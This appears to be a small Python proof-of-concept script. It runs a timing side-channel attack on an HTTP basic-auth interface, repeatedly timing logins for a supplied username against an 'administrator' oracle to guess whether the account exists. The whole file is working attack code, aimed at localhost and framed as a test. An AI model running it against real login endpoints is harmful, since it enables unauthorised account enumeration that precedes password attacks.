#!/usr/bin/python
# this script, attempts to use the timing variation in real users and nonuser 
# inputs to an http basic auth interface.

# The premise is, find an oracle (in this case we use Administrator) and use the 
# Aggregate response time as the baseline.  We create an example administrator
# user for the purposes of this test.

# The script currently takes a single input ala: './basicauth.py username'
import sys
import timeit

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

target="localhost"
username=sys.argv[1]
oracle="administrator"
password="testa"

execme="""import requests
url = 'http://"""+target+"""'
r = requests.get(url, auth=('""" + username+"""','"""+ password+"""'))
"""

execmenext="""import requests
url = 'http://"""+target+"""'
r = requests.get(url, auth=('""" + oracle +"""','"""+ password+"""'))
"""


avggarb=avgreal=i=totreal=totgarb=exitweight=0
while True:
	i+=1
	garbageuser=timeit.timeit(execme,number=1)
	realuser=timeit.timeit(execmenext,number=1)
	if(i > 1):
		avggarb=garbageuser+avggarb/2
		totgarb+=garbageuser
		avgreal=realuser+avgreal/2
		totreal+=realuser
	else:
		totreal=avgreal=realuser
		totgarb=avggarb=garbageuser
	if( i % 900 == 0):
		if(abs((totreal/totgarb)-1) > 0.059):
			flag=bcolors.FAIL
			print username +" : doesn't exist"
		else:
			flag=bcolors.OKGREEN
			exitweight+=1
			print username +" : could exist"
		print flag + "RU/GU AVG:" + str(avgreal)+"/"+str(avggarb) + "["+str(exitweight) +"/"+str(i/500)+"]"+"TRE/TGB:"+str(totreal)+"/"+str(totgarb)+","+str(abs((totreal/totgarb)-1 ))+bcolors.ENDC
		exit(0)
